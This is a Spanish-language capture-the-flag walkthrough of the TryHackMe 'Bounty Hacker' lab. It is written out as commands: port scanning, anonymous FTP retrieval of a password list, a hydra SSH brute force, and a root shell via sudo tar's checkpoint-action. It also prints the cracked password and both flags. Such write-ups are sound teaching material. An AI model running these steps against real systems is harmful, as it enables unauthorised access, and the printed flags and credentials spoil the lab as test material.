# Bounty Hacker | TryHackMe
## 📝 Resumen
Esta máquina representa un entorno vulnerable orientado a pentesting inicial y escalada de privilegios. El reto consiste en aprovechar un servicio FTP abierto, extraer información sensible, realizar una fuerza bruta sobre SSH, y finalmente escalar privilegios usando un binario mal configurado (tar).
Se obtienen dos flags: user.txt y root.txt.

## 🧰 Herramientas utilizadas


## 🔍 Pasos detallados
### 1. 🛰 Verificación de conectividad
```bash
ping -c 1 10.10.119.45
```

### 2. 📦 Escaneo de puertos
```bash
nmap -p- --open -sS -sC -sV --min-rate=5000 -n -vvv -Pn 10.10.119.45 -oN escaneo.txt
```
Puertos abiertos detectados:
- 21/tcp – FTP (vsftpd 3.0.3)
- 22/tcp – SSH (OpenSSH 7.2p2)
- 80/tcp – HTTP (Apache 2.4.18)

### 3. 📁 Conexión al FTP
```bash
ftp 10.10.119.45
# login: anonymous
ftp> passive
ftp> ls -la
ftp> get locks.txt
ftp> get task.txt
```

### 4. 📄 Revisión de archivos descargados
```bash
cat locks.txt  # Diccionario con posibles contraseñas
cat task.txt   # Notas firmadas por el usuario "lin"
```

### 5. 🔓 Fuerza bruta sobre SSH
```bash
hydra -l lin -P locks.txt ssh://10.10.119.45
```
🔑 Credenciales encontradas:
- Usuario: lin
- Password: RedDr4gonSynd1cat3

### 6. 🔑 Acceso remoto por SSH
```bash
ssh lin@10.10.119.45
```

### 7. 🏁 Flag de usuario
```bash
cd ~/Desktop
cat user.txt
Resultado: VEhNe0NSMU0zX1N5TmQxQzRUM30=
```

### 8. 🔼 Comprobación de privilegios sudo
```bash
sudo -l
```
lin puede ejecutar /bin/tar como root sin contraseña

### 9. 💻 GTFObins
Buscamos el binario /tar para buscar que comando podemos ejecutar para obtener una shell como root:
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

### 10. 🚀 Escalada de privilegios usando tar
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
whoami
Resultado: root
```

### 11. 🏁 Flag de root
```bash
cd /root
cat root.txt
Resultado: VEhNe0IwVU43WV9oNGNLM3J9
```
---
